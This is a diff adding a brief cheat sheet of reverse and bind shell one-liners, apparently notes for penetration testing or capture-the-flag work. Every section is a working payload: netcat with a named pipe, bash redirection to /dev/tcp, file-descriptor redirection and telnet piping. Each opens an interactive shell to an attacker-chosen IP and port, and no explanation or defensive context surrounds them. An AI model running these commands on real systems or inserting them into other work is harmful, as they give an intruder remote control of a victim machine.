@@ -1,0 +1,27 @@
+make your env variables for easy command calling
+IP=your IP
+PORT=your prefered port
+
+
+mkfifo /tmp/f; nc -lvnp $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+ 
+
+mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $IP $PORT >/tmp/f
+ 
+
+Bash TCP
+bash -i >& /dev/tcp/tun0/$PORT 0>&1
+
+0<&196;exec 196<>/dev/tcp/tun0/4242; sh <&196 >&196 2>&196
+
+/bin/bash -l > /dev/tcp/tun0/4242 0<&1 2>&1
+Telnet
+nc -lvp $PORT1
+nc -lvp $PORT2
+
+
+telnet $IP $PORT | /bin/sh | telnet $IP $PORT
+ 
